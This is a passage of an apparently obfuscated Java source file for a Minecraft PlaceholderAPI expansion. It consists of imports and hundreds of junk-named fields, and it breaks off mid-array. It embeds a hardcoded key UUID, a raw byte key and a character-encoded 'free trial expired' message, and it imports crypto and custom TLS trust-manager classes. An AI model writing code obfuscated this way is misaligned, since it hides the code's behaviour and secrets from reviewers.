package org.example;


import me.ryanhamshire.GriefPrevention.Claim;
import me.ryanhamshire.GriefPrevention.ClaimPermission;
import me.ryanhamshire.GriefPrevention.GriefPrevention;
import org.bukkit.attribute.Attribute;
import org.bukkit.block.Container;
import org.bukkit.block.data.*;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.Damageable;
import org.bukkit.inventory.*;
import org.bukkit.inventory.meta.*;
import org.bukkit.metadata.FixedMetadataValue;
import org.bukkit.persistence.PersistentDataContainer;
import org.bukkit.persistence.PersistentDataType;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.PluginManager;
import org.bukkit.potion.PotionEffect;
import org.bukkit.projectiles.ProjectileSource;
import org.bukkit.scoreboard.Scoreboard;
import org.bukkit.scoreboard.Team;
import org.bukkit.util.BoundingBox;
import org.bukkit.util.RayTraceResult;
import org.jetbrains.annotations.Nullable;
import org.json.JSONArray;
import org.json.JSONObject;
import com.comphenix.protocol.PacketType;
import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.events.PacketContainer;
import com.comphenix.protocol.wrappers.BlockPosition;
import com.ssomar.score.utils.emums.VariableType;
import com.ssomar.score.variables.Variable;
import com.ssomar.score.variables.VariableForEnum;
import com.ssomar.score.variables.manager.VariablesManager;
import me.clip.placeholderapi.PlaceholderAPI;
import me.clip.placeholderapi.expansion.PlaceholderExpansion;

import net.luckperms.api.LuckPerms;
import net.luckperms.api.LuckPermsProvider;
import net.luckperms.api.model.user.User;
import net.luckperms.api.node.Node;
import org.bukkit.*;
import org.bukkit.Color;
import org.bukkit.block.*;
import org.bukkit.block.data.type.Slab;
import org.bukkit.block.data.type.Stairs;
import org.bukkit.boss.BarColor;
import org.bukkit.configuration.InvalidConfigurationException;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.*;
import org.bukkit.potion.PotionEffectType;
import org.bukkit.scheduler.BukkitRunnable;
import org.bukkit.scheduler.BukkitTask;
import org.bukkit.util.Vector;
import org.bukkit.boss.BossBar;
import org.bukkit.boss.BarStyle;
import org.jetbrains.annotations.NotNull;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.imageio.ImageIO;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.security.*;
import java.security.cert.X509Certificate;
import java.security.spec.X509EncodedKeySpec;
import java.time.LocalDate;
import java.time.temporal.ChronoUnit;
import java.util.*;
import java.util.Comparator;
import java.util.List;





import java.nio.file.Files;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.function.Supplier;
import java.util.stream.Stream;

/**
 * This class will automatically register as a placeholder expansion
 * when a jar including this class is added to the /plugins/placeholderapi/expansions/ folder
 *
 */
@SuppressWarnings("ALL")
public class ExampleExpansion extends PlaceholderExpansion {

    public final String toywuanftwyft;
    public final String to23nyutn2fy3ut;
    public final String tony23untyquwfnt;
    public final String to2i3ufnk2w;
    public final String ton2y3uftno2yfwun;
    public final String to2myutn2y4udn2wfptw;
    public final String t2ofyutny2fu4tdn;
    public final String to2nyfutkworyt;
    public final String mt2ftowtt;
    public final String t2fktowrsetn;
    public final String tk2tfuynwyu;
    public final String tko2y4utnoyUFT;
    public final String t2oynoyuD;
    public final String dok23ipudhyfurnydunfp;
    public final String k2yo4utyunhOYUndoyun;
    public final String tkoy2untoyun23fytunt;
    public final String cpienoien3i;
    public final String toky4ukoftfpv;
    public final String oenoeinyunuione;
    public final String neionioenoieneionienin;
    public final String kfikyfuwntyouwfnt;
    public final String tkoinyunyunyunfwytunoyuwnftwft;
    public final String koy42unoywunfc;
    public final String to2utnyunoyunst;
    public final String pk23bkptbktwfdfb;
    public final String a3f4dtkyuwfdk;
    public final String ncdot;
    public final String kmartrtrsdt;
    public final String mdknpkep3nd;
    public final String mtmmmtf;
    public final String mt2mmtm234t;
    public final String mmco2mcmm23mt;
    public final String mt2mmt23ptrt;

    public final String n234oyudnop3yudnwd;
    public final String tno2y3u4ntoy2u4nt2;
    public final String d2ny4udn2yu43dn2tf;
    public final String dnoty3unoy3bkdty3pdt;
    public final String pnoyu2ktyl43;
    public final String oy43udnoy3kpldfttv;


    private static final Map<UUID, BukkitTask> tyto2uny2uf4ntdoy2utd = new ConcurrentHashMap<>();
    
    // HOSTILE MOBS
    public  final Set<EntityType> HMsetnoy2un2yundt ;
    private static final java.util.concurrent.ConcurrentHashMap<Object, Object> f113 = new java.util.concurrent.ConcurrentHashMap<>();

    private static final ConcurrentHashMap<UUID, f115> f114 = new ConcurrentHashMap<>();
    // One task per turret UUID
    private static final Map<UUID, BukkitTask> f116 = new ConcurrentHashMap<>();
    // One repeating task per turret UUID

    // Deadline (ms since epoch) for each active turret; extend/reset this to refresh timer
    private static final Map<UUID, Long> f117 = new ConcurrentHashMap<>();

    // KEYYYYY
    private static final String f111 = "67e94e0c-1f2b-4fd9-bb3f-5f7052f9072b";

    public static final char targetme = ',';
    
    // Current target reference per turret so we can retarget while the task runs
    private static final Map<UUID, AtomicReference<LivingEntity>> f118 = new ConcurrentHashMap<>();



    public final String twoyfnafyutwfyutdah;    public final String kot2u3noyunwft;    public final String tk2y3ut;    public final String tky2futnwf;    public final String ty2o3uktyukrst;    public final String tkyou23n4dt;    public final String tkoy23ukdtyufktd;    public final String mtyo23utkyowfutn;    public final String idnvpwyuvn;    public final String otyn2oyund;    public final String kydluhyhnd4;    public final String tny2untdy2ud;    public final String ty23ntyu23ntd;    public final String tny2u34ndy4u2dn;    public final String tky2u3tny2undt;    public final String tnyu2nd24d24fwdt;    public final String t2yudky2u43d24fd;    public final String f112;    public final String lpkb6;    public final long dnkpydunpdyupfnd;    public final String oyundyoufkovy3pwkafvpd;    public final String kty2fkty2fodn3fdt;    public final String TLS;    public final String ppi;    public final String salcv;    public final String ytuwfndyunwfd;    public final String dyunwfydunwfd;    public final int tyunwfdwfd;    public final int INT;    public final String duwnfdyuwnfd;    public final boolean arsdienwdhw;    public final int INT3;    public final boolean NEW_VALUE1;    public final String tlk;    public final String RSA_ECB_PKCS_1_PADDING;    public final String NEW_VALUE_3;    public final String piarc;    public final String cfgy;    public final String test32;    public final String ymhawb;    public final String nw;    public final int I;    public final String m23;    public final String ymo;    public final String R;    public final String er;    public final String er2;    public final String ind;    public final String te;    public final String rsm;    public final String yhe;    public final String peei;    public final String ei;    public final String yt;    public final String nst;    public final int xm;    public final String LAST_CHUNK_Z;    public final String LAST_Y;    public final int INT4;    public final String SLOT;    public final int INT5;    public final int xtxtxt;    public final String dccs;    public final String fts;    public final int INT6;    public final String corporatesecurity;    public final String Gradspecisoauce;    public final String fastfood;    public final String privateinvestigator;    public final int INT7;    public final int ccp;    public final String steak;    public final String gusfring;    public final String ehmantrout;    public final String amiunderarrest;    public final String oraminot;    public final int suppose;    public final int mill2;    public final int drain;    public final String ed;    public final String some;    public final String keep;    public final int low;    public final String twentythreedegrees;    public final String nbf;    public final double wife;    public final String complicated;    public final String basketball;    public final String bt;    public final String upt;    public final String soalp;    public final String tmc;    public final String excepthomer;    public final String iou;    public final String dontwantmargetoknow;    public final String lessofaman;    public final String ballet;    public final String magellan;    public final String dance;    public final String nationalanthems;    public final String cigarrette;    public final double debtsoff;    public final double callitof;    public final String clicks;    public final double emotionalthermo;    public final int somature;    public final int dontvanish;    public final int shapeyou;    public final double tsr;    public final float whoasked;    public final float biological;    public final double whocantreceive;    public final int costofgrowinguptoofast;    public final double whatkindofadulthood;    public final int nobodysrescuingyou;    public final long ihearyounow;    public final long healing;    public final String toescortyou;    public final String outtahere;    public final String ost;    public final String naltextc;    public final double getsshoes;    public final String pn;    public final double esetawftawft;    public final double doyouknow;    public final double thepeoplewholive;    public final String whurl;    public final String dontwannawatchurcat;    public final String kindastoppls;    public final double okacyyool;    public final String ihatethisguy;    public final String coffedown;    public final String assaultobstrc;    public final String yourlastname;    public final String pickme;    public final String specifically;    public final String sulrred;    public final String tryingtofigure;    public final String nomotivation;    public final String bopabfunpa;    public final String whynotofficerlent;    public final String dontlikepolice;    public final String holdonasec;    public final String isitbiased;    public final String groupofindividuals;    public final String ifellvictimized;    public final String trsts;    public final String goingtojail;    public final String seatbelton;    public final String norstand;    public final String takecareofcat;    public final String thoughtaboutthat;    public final String dontcommitcrime;    public final String unharmed;    public final String provenguilty;    public final String inACOURT;    public final String oflaw;    public final String murdercase;    public final String malecacuasion;    public final String boetcher;    public final String specialty;    public final String heisenburg;    public final String heisenburgformercook;    public final String hippiedippy;    public final String thisbabby;    public final String cos;    public final String pullingfiles;    public final String galeboet;    public final String whopaid;    public final String nobody;    public final String whodid;    public final String pushmore;    public final String noaddress;    public final String corporatelawyer;    public final String vrickwall;    public final String madrigalelectro;    public final String hanoveregerm;    public final String tsrt;    public final String foothold;    public final String mericanfastfood;    public final String pooloshermanos;    public final String sowhat;    public final String wherehislabwas;    public final String apartmentsrtsas;    public final String crzyidea;    public final String foayhup;    public final String napking;    public final String fermented;    public final String lentilbread;    public final String finechickinjoint;    public final String meetingsomeone;    public final String gusfrang;    public final String rstat;    public final String dfprdhyfp;    public final String fwypdohf3yrpdhunf;    public final String yowdghwa34yd;    public final String reaching;    public final String oafudnwpfydu;    public final String colonel;    public final String sanders;    public final String fourteencalls;    public final String notanswerignphone;    public final String needatpoliceoffcicer;    public final String whatelesuwannaknow;    public final String nedambulanec;    public final String taowyfdh;    public final String whatsmyaddress;    public final String yesmaaam;    public final String threeunitsenroute;    public final String tafopd;    public final int ydtfhwpdylh;    public final String tywfnty;    public final String dplufirh3;    public final String fobyufhpbyurhpbf;    public final String tyh34dl;    public final String udlohlyp3whdoyplwd;    public final String opdh34yudhn;    public final String doyupn3wdyu3pnd;    public final String y34hodnyu234;    public final String onienod34;    public final String nienoy24;    public final String illcallhim;    public final String trcfpd243;    public final String ndeo3poiewnd4p3;    public final String iepfndioepwndoyfupadnfpd;    public final double childingdanger;    public final double seenher;    public final double aintnobody;    public final double thisistherecording;    public final double tdrsitrtomychd;    public final double stoppedrcying;    public final long startingthehouse;    public final double imtakingher;    public final String cryingiwenftipfwnt;    public final String righttobehrere;    public final String callmewhatever;    public final String blackandwhitedocs;    public final String sufficentprobablycause;    public final String getoffthebike;    public final String iantgoinnowhere;    public final String abuseofn911;    public final String noreason;    public final String takeitout;    public final String trstwft;    public final String yntdy4u3;    public final String heshurtpls;    public final String hurtingmyarmsag;    public final String plsgetoff;    public final String hurtingarmtsnwit;    public final String svacum;    public final String hurtingmesyr;    public final String foolishness;    public final String ouydnop3yundoypufna;    public final String einoienoiendw3pf;    public final String thatsathreatdyu;    public final String puthandsebhind;    public final String sendanotherunit;    public final String handsbehindback;    public final String gonnagettazed;    public final String stoprsietnsr;    public final String oundg324yutdng4;    public final String dienfwopiednpf;    public final String eindo3ie42ndoi34;    public final String iendie2nd;    public final String ieanrdowienfdf;    public final String wiodtnowiupd;    public final String wifednow34und43wd;    public final String odunyuw4dn4;    public final String don34uynp3d;    public final String goingtojailwfitdnwofduyn4w;    public final String youdnoy3wupdnoy3wupdn;    public final int oiwfndtoyu42nd24;    public final String tn243oyudnt42fuytdn;    public final String eingdoi3e4ndg34;    public final String ongo34ungdo3iu4ndg4gdw4;    public final String pdifnoian4;    public final String oendinpdoinpd;    public final String ieodnoie4ndw3f4;    public final String ietonwifandt4u3nd34dw3;    public final String tneoaiwfndtowui4nd4fdt;    public final String itenwoipwfnaidun4w;    public final String ipendfofpiwdnoo43iwund;    public final String tneeiond4;    public final String kdienwfp;    public final String midenwyudp4;    public final String wfudnofypundap;    public final int wdnywfundywfudn;    public final int wyundywufndywufpndywuf;    public final String tuywnfydunwfyudn;    public final String wtdyuwnfdyunwf;    public final int odafuwidnowfidun;    public final double wfopdwfnodowfin;    public final String wfodwfdkywf4d;    public final String iersdienrodyfwunpd;    public final String twoiaefndoiwfudnfoyudn;    public final long dtnowifepdnaowifudn;    public final String ofwuandouwfynd;    public final String towfyuandoywfun;    public final String wofudnaoywfudn;    public final String wdynuwfyudnywufand;    public final String fdfopudnyafupdn;    public final String fwpdonufpdyufanpd;    public final String wyfudnoawfyudno;    public final String op4ydhnfaoypudn;    public final String ydfnfpoyrudn;    public final String pwoyfdunowypfuadn;    public final String wfuyntdywfupadh;    public final String yfpwduhywuhdp;    public final String pdonfapyudn;    public final String pdyunpfwyd;    public final String dyfpnwoyufpn;    public final String fydnayfpudhn;    public final String wfduynwfydaun;    public final String duynwyfpaudnwfp;    public final String wfdunyunda;    public final String wdpyunwpfydunpd;    public final String yuwndyuwpdn;    public final String wfydunwfyudn;    public final String wfydnywfpudn;    public final String wyfudnywfud;    public final float idwfpndywud;    public final int yuwfndgyuwfnd;    public final int yfpdunwyupnd;    public final String wyufodnhawyfudn;    public final String reaidntarisedn;    public final String dwyufndywfudn;    public final String wfydpunwfyudnwfd;    public final String dn3owyaufpdnfwd;    public final String fypodunfarypudna;    public final String wyufdnywufdn;    public final String wyudnwfydun;    public final String ywudnywufd;    public final String wyfundwf;    public final String yuwfndoywfudn;    public final String yduwfdg;    public final String ywfpdnoywfudnowfyudn;    public final String fwdyunwfydunfwd;    public final String wfdyunwfd;    public final String podfyunwfpdyunwfp;    public final String fypudnofpyudn;    public final String ywufdnywufnd;    public final String odyun4wyunwpf;    public final String doyuwfndayuwnfdoyfwuanad;    public final String wofduynwfdyun;    public final String wfuydnywfund;    public final String opfdyunfapoydunfpd;    public final String dwoyuawfdhoywufdh;    public final String wfdionaywufdnawf;    public final String wfdywfudhwfy;    public final String wfdoyunawfpdyunwfp;    public final String wfpodyuw;    public final String rsydun;    public final String wydhwypd;    public final String wdfywunda;    public final String wfdyunowfaydun;    public final String wyfundywpfudn;    public final String awfodyunwyupdnwfoydun;    public final String ywufdnywfuoadn;    public final String ywfudnoawfypdunwfyoudnwfp;    public final String ywfpaudnoywfudnowyufdn;    public final String ywudnoayfwudn;    public final String ywfdnwyfudn;    public final String wfdyuwfdyu;    public final String ydhuyawfpdh;    public final String wyudnywufodn;    public final String wfydunwofyudanfwd;    public final String wfydunaowfydun;    public final String wfyutdnwyfaudnwfydoun;    public final String wyufdnaywfudnwfda;    public final String wfpydunaowfyudn;    public final String wfydunwafydunfwaydun;    public final String ydunwfdunwfdwfdunwfdyun;    public final String wyufdnaowyufdnawoyfudn;    public final int yufdaywfudnwfd;    public final String wfypdnawofyudnwfpa;    public final int fdhkypfwd;    public final String wfkdgywfpdawfyp;    public final String dwkfydufwdfw;    public final String kwdfyufwd;    public final String dywfadbkwyfudb;    public final String wfydunwyfudnwfdyun;    public final String wfydutnwfyudnwf;    public final String wduynawyfpudnaw;    public final String wadywfundfy;    public final String wdyunwfyudn;    public final String wdyuwfndywufn;    public final String wdyunawfydunfwd;    public final String wfydnwyfuad;    public final String dhnfpwyadun;    public final String wyufdanywfudn;    public final String dyunwypfudnawfdyun;    public final String wdayuwfnd;    public final String kwafpdkwfpad;    public final String wfduynwyaufnd;    public final String wfytkdawfdwpfdun;    public final long dkwfyduwfndt;    public final String fydunaofpdunafpwd;    public final String pdyunawfdyunwf;    public final String wyfduanwfoydunwfd;    public final String wfopdyaufhdfpdf;    public final String owdyaunwfpydu;    public final String dawyfudnowfd;    public final String awufdwfda;    public final String dywufndoywuand;    public final String taywfuntarosdulf;    public final String wkfdwya;    public final String pydaunfw;    public final String dyanuowfd;    public final String wfktdyawfd;    public final String wyfdunafwd;    public final String dy87duh;    public final String wdypfauwdnwfpd;    public final String wktyfwutnwaft;    public final String dkfiaphd;    public final String wfpondyaunpdpw;    public final String fpkdyafpd;    public final String dokyfupkdoapdf;    public final String fpydnwfypudnfpd;    public final String wydkawyfpudawfd;    public final String aoienrstd;    public final String tyabfydkfpydnpfd;    public final String wyndaoyfwpudnfpd;    public final int tyafndydpfw;    public final String fysoadunofwypdun;    public final String yrsndoawyfudn;    public final String swyadunwfoydun;    public final String naoyfdundfw;    public final String owayfudny34hyfundywfudw;    public final String fudnoaywfudhoywafld;    public final String fwaodhwfypdh;    public final String fydnoafypudkopnbkdf;    public final String foaybkfpoyubhl;    public final String pfwydoakfopydhfpwoyd;    public final String yofapdnoyfpubdhfyp;    public final String iedn4dn8394d;    public final String oi2n43g234g;    public final String enhien4g;    public final double kiek4d;    public final String yfnvdyfupbd;    public final String kdin34d34dn;    public final String ky3dnk34npdk3yp4ndky34pdnk3;    public final String kyntkyfuwnd;    public final String kifwpnevdkiwpfend;    public final String ywntvyoafupbnf;    public final String pdnofypundafopd;    public final String fpondafypudnopfyudn;    public final String dnofpadn4;    public final String dnoi43end;    public final String niend4;    public final String notiefpnd4;    public final String osiaenoiwfend4;    public final String teianfoipedn4;    public final String io2e4npoie2nt;    public final String ioidenipofaedn4;    public final String io3iedn3i4p;    public final String iopidqen34i;    public final String wifadndgn43gd;    public final String io34igeng;    public final String io43gdie34ngd;    public final String yunyundg54h45;    public final String iendoi34nd;    public final String ifendioafepnd34fd;    public final String idenpoaidn34;    public final String iepdn3idn34d;    public final String ioandi3n4dy43udn3pfd;    public final String fipdenao3idn34ydun;    public final String pd3ipdn34d;    public final String wfonvdawfydunp;    public final String fpiednfpden3;    public final String fdon34d43d;    public final String ifpndoi3nd34;    public final String nodyu3pnd43d;    public final String wfnitfwtd;    public final String nydufpnbfpbfpb;    public final String yfpdnofayundfpd;    public final String fydnofyapudnfpd;    public final String opdnd34d;    public final String ipfnedfipdnpd;    public final String fypdnafoypudn;    public final String fpdnafpduyn;    public final String ypdn3oypdun;    public final String nyduk34;    public final String y34udky3d;    public final String ydu3k4ybd3pd;    public final String ypfuwnvwfpd;    public final String y4dnyfwudn;    public final String finovayfupbnyfpubhofpubnfp;    public final String fpybunyu43nb;    public final String pyndy3upnbd;    public final String ypu3bnyfpubn;    public final String ywofpdnvoypu;    public final String yvunoyup3;    public final String nytuwfntf;    public final String wkyvuwftnwfyutn;    public final String yuntunyun342;    public final String yunduyn4;    public final String vkdyunt;    public final String ktyunt32;    public final String ydny32u4nd24d;    public final String ntynu23nt;    public final String vyf3b3;    public final String t2u3nty23unt;    public final String yfwunvtyn;    public final String ytunyun4;    public final String ydnyu3n4d;    public final String ny2u4ndt23d;    public final String uydn2yu3nd23;    public final String ydny3udno34yduhn3d;    public final String yndoyund4;    public final String udny3u4nd;    public final String dny324d;    public final String yutn23;    public final String dy3und3u4d;    public final String tyun2;    public final String ydun2d;    public final String ytun23yutn;    public final String tyn23yunt32t;    public final String ydtun34ydun;    public final String tnyu2nt23;    public final String ydn2ydun;    public final String dny34und;    public final String vyn3vy3v;    public final String wyunvywufntd;    public final String dyo3npd3d;    public final String dyn2yudn24;    public final String dyun3ydun3d;    public final String y2un34yudn234d;    public final String tyun2t;    public final String kd3nd;    public final String dny2udt;    public final String ntyu2n3t;    public final String kyut2n2u3nt;    public final String yntu2nt;    public final String nyup23np;    public final String tn2yu3tn2;    public final String tn2ytn23t;    public final String ytnfyu3ndt34f;    public final String tuyn2y3utn2t;    public final String tyun23utyn23t;    public final String tyu23nt23t;    public final String tyn2fnt2;    public final String knde43d;    public final String ynvkypn3v3;    public final String kientien2t;    public final String tyu23ntyu23nt;    public final String tynwdy2d;    public final String uydn3yund;    public final String yuntyun2t;    public final String dyn3ydun;    public final String ydn3yudn34d;    public final String dyu42ndyu432nd;    public final String fuytn2yudt;    public final String yundt2yud;    public final String y3udny3u4nd34d;    public final String yundyu34nd;    public final String yufdtnoyupnd3d;    public final String udn3y4udn34ydu;    public final String yudnyu43nd;    public final String ydn3y4d;    public final String y4dun3y4udn34;    public final String dyu24ndyu24nd2d;    public final String dyn34ydun3d4;    public final double udnyupndpd;    public final String do3ndyu3pnd3d;    public final String dnpyuadnyfpudnfpdfpd;    public final String dy3updnyapudny34undh;    public final String dnyu3nd3d;    public final String dk3ed34dyu3nd;    public final String yudyu2dnyu42dn2d42d;    public final String tiewntien42;    public final String y23u4ndyu3n4d;    public final String dy2un4dy2u4nd4d;    public final String un324yudn243yudn;    public final String u4ndy24und24yd;    public final String yudn3wypu4ndh;    public final String dyu2n4dyun2f4;    public final String y24und;    public final String y2u4dhyu2nd;    public final String yn23yund2y3udn;    public final String ydun2ydun23d;
    
    
    
    
    // A deadline (in ms, epoch) for each active turret; further detections extend this
    protected final Map<String, List<Map.Entry<String, Integer>>> f119 = new HashMap<>();

    
    
    private static long f121 = 0; // in millis

    protected static final ConcurrentHashMap<UUID, Vector> f122 = new ConcurrentHashMap<>();

    protected final File f123;
    protected final YamlConfiguration g2;

    protected final Map<Location, BukkitTask> g3 = new HashMap<>();
    protected final Map<Location, Integer> g4 = new HashMap<>();

    protected boolean WorldEdit_Installed = false;
    protected boolean WorldGuard_Installed = false;
    protected boolean LuckPerms_Installed = false;
    protected boolean ProtocolLib_Installed = false;
    protected boolean GriefPrevention_Installed = false;

    protected static boolean SCore_Installed = false;
    protected int g5;
    protected final Map<Location, UUID> wdouywndoywufnd = new ConcurrentHashMap<>();
    byte[] kfc222 = new byte[] {
            (byte)0xCF, (byte)0xA5, (byte)0xB0, (byte)0x27, (byte)0xEB, (byte)0xFA, (byte)0x46, (byte)0xA1,
            (byte)0x41, (byte)0xBD, (byte)0xCC, (byte)0x38, (byte)0xE5, (byte)0x27, (byte)0xC0, (byte)0x9F,
            (byte)0x26, (byte)0xE2, (byte)0x39, (byte)0xE4, (byte)0xED, (byte)0x7A, (byte)0xBB, (byte)0xBC,
            (byte)0xFD, (byte)0x09, (byte)0x53, (byte)0xB7, (byte)0x3D, (byte)0x93, (byte)0xEC, (byte)0x5C
    };


    private final Map<UUID, Double> EI_INSTALLED = new ConcurrentHashMap<>();
    private final Map<UUID, BukkitTask> EB_INSTALLED = new ConcurrentHashMap<>();
    protected final Map<UUID, Location> dwofundoywfund = new ConcurrentHashMap<>();


    protected final Set<Material> es = EnumSet.of(
            Material.ACTIVATOR_RAIL,
            Material.AIR,
            Material.BAMBOO,
            Material.BLACK_BANNER,
            Material.BLUE_BANNER,
            Material.BEETROOT_SEEDS,
            Material.STONE_BUTTON,
            Material.OAK_BUTTON,
            Material.BIRCH_BUTTON,
            Material.SPRUCE_BUTTON,
            Material.JUNGLE_BUTTON,
            Material.DARK_OAK_BUTTON,
            Material.ACACIA_BUTTON,
            Material.MANGROVE_BUTTON,
            Material.CHERRY_BUTTON,
            Material.CRIMSON_BUTTON,
            Material.WARPED_BUTTON,
            Material.LIGHT_BLUE_BANNER,
            Material.BROWN_BANNER,
            Material.CYAN_BANNER,
            Material.GRAY_BANNER,
            Material.GREEN_BANNER,
            Material.LIGHT_GRAY_BANNER,
            Material.LIME_BANNER,
            Material.MAGENTA_BANNER,
            Material.ORANGE_BANNER,
            Material.PINK_BANNER,
            Material.PURPLE_BANNER,
            Material.RED_BANNER,
            Material.WHITE_BANNER,
            Material.YELLOW_BANNER,
            Material.CARROTS,
            Material.CHORUS_FLOWER,
            Material.CHORUS_PLANT,
            Material.COBWEB,
            Material.COCOA,
            Material.BRAIN_CORAL,
            Material.BUBBLE_CORAL,
            Material.FIRE_CORAL,
            Material.HORN_CORAL,
            Material.TUBE_CORAL,
            Material.BRAIN_CORAL_FAN,
            Material.BUBBLE_CORAL_FAN,
            Material.FIRE_CORAL_FAN,
            Material.HORN_CORAL_FAN,
            Material.TUBE_CORAL_FAN,
            Material.DEAD_BUSH,
            Material.DETECTOR_RAIL,
            Material.END_GATEWAY,
            Material.END_PORTAL,
            Material.FIRE,
            Material.DANDELION,
            Material.POPPY,
            Material.BLUE_ORCHID,
            Material.ALLIUM,
            Material.AZURE_BLUET,
            Material.RED_TULIP,
            Material.ORANGE_TULIP,
            Material.WHITE_TULIP,
            Material.PINK_TULIP,
            Material.OXEYE_DAISY,
            Material.CORNFLOWER,
            Material.LILY_OF_THE_VALLEY,
            Material.WITHER_ROSE,
            Material.FLOWER_POT,
            Material.FROGSPAWN,
            Material.WARPED_FUNGUS,
            Material.CRIMSON_FUNGUS,
            Material.GLOW_BERRIES,
            Material.GLOW_LICHEN,
            Material.SHORT_GRASS,

            Material.HANGING_ROOTS,
            Material.PLAYER_HEAD,
            Material.SKELETON_SKULL,
            Material.CREEPER_HEAD,
            Material.WITHER_SKELETON_SKULL,
            Material.ZOMBIE_HEAD,
            Material.DRAGON_HEAD,
            Material.PIGLIN_HEAD,
            Material.KELP,
            Material.LADDER,
            Material.LAVA,
            Material.LEVER,
            Material.LIGHT,
            Material.LILY_PAD,
            Material.MANGROVE_PROPAGULE,
            Material.MELON_SEEDS,
            Material.MOSS_CARPET,
            Material.RED_MUSHROOM,
            Material.BROWN_MUSHROOM,
            Material.NETHER_PORTAL,
            Material.NETHER_SPROUTS,
            Material.NETHER_WART,
            Material.PINK_PETALS,
            Material.PITCHER_PLANT,
            Material.PITCHER_POD,
            Material.POTATOES,
            Material.POWDER_SNOW,
            Material.POWERED_RAIL,
            Material.OAK_PRESSURE_PLATE,
            Material.BIRCH_PRESSURE_PLATE,
            Material.SPRUCE_PRESSURE_PLATE,
            Material.JUNGLE_PRESSURE_PLATE,
            Material.DARK_OAK_PRESSURE_PLATE,
            Material.ACACIA_PRESSURE_PLATE,
            Material.MANGROVE_PRESSURE_PLATE,
            Material.CHERRY_PRESSURE_PLATE,
            Material.CRIMSON_PRESSURE_PLATE,
            Material.WARPED_PRESSURE_PLATE,
            Material.STONE_PRESSURE_PLATE,
            Material.LIGHT_WEIGHTED_PRESSURE_PLATE,
            Material.HEAVY_WEIGHTED_PRESSURE_PLATE,
            Material.PUMPKIN_SEEDS,
            Material.RAIL,
            Material.COMPARATOR,
            Material.REDSTONE_WIRE,
            Material.REPEATER,
            Material.REDSTONE_TORCH,
            Material.REDSTONE_WALL_TORCH,
            Material.OAK_SAPLING,
            Material.BIRCH_SAPLING,
            Material.SPRUCE_SAPLING,
            Material.JUNGLE_SAPLING,
            Material.DARK_OAK_SAPLING,
            Material.ACACIA_SAPLING,
            Material.CHERRY_SAPLING,
            Material.SCULK_VEIN,
            Material.SEA_PICKLE,
            Material.SEAGRASS,
            Material.SHORT_GRASS,
            Material.DEAD_BUSH, // Re-listed for redundancy
            Material.OAK_SIGN,
            Material.BIRCH_SIGN,
            Material.SPRUCE_SIGN,
            Material.JUNGLE_SIGN,
            Material.DARK_OAK_SIGN,
            Material.ACACIA_SIGN,
            Material.CHERRY_SIGN,
            Material.MANGROVE_SIGN,
            Material.CRIMSON_SIGN,
            Material.WARPED_SIGN,
            Material.SMALL_DRIPLEAF,
            Material.SNOW,
            Material.SPORE_BLOSSOM,
            Material.STRING,
            Material.STRUCTURE_VOID,
            Material.SUGAR_CANE,
            Material.SWEET_BERRY_BUSH,
            Material.TORCH,
            Material.TORCHFLOWER_SEEDS,
            Material.TRIPWIRE_HOOK,
            Material.TURTLE_EGG,
            Material.TWISTING_VINES,
            Material.VINE,
            Material.WATER,
            Material.WEEPING_VINES,
            Material.WHEAT_SEEDS,
            Material.WHITE_TULIP
    );




    protected static final boolean g6 = false;


    protected final Map<UUID, BukkitTask> g7 = new HashMap<>();

    protected static final Map<String, ffs> g8 = new HashMap<>();
    public static final int INT1 = 1000;
    public static final int INT2 = 60;
    protected static final File g10 = new File("plugins/Archistructures/particles");


    protected final Map<Location, BukkitTask> g11 = new HashMap<>();

    protected final File g12;
    protected final File g13;
    protected final File g14;
    protected final File g15;
    protected final File g16;
    protected final YamlConfiguration g17;
    protected final YamlConfiguration g18;
    protected final Map<Location, BlockData> g19 = new HashMap<>();
    protected final YamlConfiguration g20;



    protected final File g21;
    protected final Map<UUID, Integer> g22;
    protected final LuckPerms g23;

    protected final Map<UUID, Set<Location>> g24 = new HashMap<>();
    protected final Set<Material> g25 = Set.of(
            Material.DIAMOND_ORE, Material.DEEPSLATE_DIAMOND_ORE,
            Material.IRON_ORE, Material.DEEPSLATE_IRON_ORE,
            Material.GOLD_ORE, Material.DEEPSLATE_GOLD_ORE,
            Material.EMERALD_ORE, Material.DEEPSLATE_EMERALD_ORE,
            Material.LAPIS_ORE, Material.DEEPSLATE_LAPIS_ORE,
            Material.REDSTONE_ORE, Material.DEEPSLATE_REDSTONE_ORE,
            Material.COAL_ORE, Material.DEEPSLATE_COAL_ORE,
            Material.NETHER_QUARTZ_ORE, Material.NETHER_GOLD_ORE,
            Material.ANCIENT_DEBRIS);
    protected final Map<Location, BukkitTask> g26 = new HashMap<>();


    protected final char[] g27 = new char[] {
            0x00A7, 0x0063, 0x00A7, 0x006C, 0x0046, 0x0072, 0x0065, 0x0065, 0x0020, 0x0074, 0x0072, 0x0069, 0x0061, 0x006C, 0x0020,
            0x0073, 0x0065, 0x0073, 0x0073, 0x0069, 0x006F, 0x006E, 0x0020, 0x0065, 0x0078, 0x0070, 0x0069, 0x0072, 0x0065, (char) 100,
            0x003A, 0x0020, 0x006C, 0x0069, 0x006D, 0x0069, 0x0074, 0x0020, 0x0072, 0x0065, 0x0061, 0x0063, 0x0068, 0x0065, (char) 100,
            0x002E, 0x0020, 0x00A7, 0x0065, 0x0059, 0x006F, 0x0075, 0x0020, 0x0063, 0x0061, 0x006E, 0x0020, 0x0065, 0x0069, 0x0074,
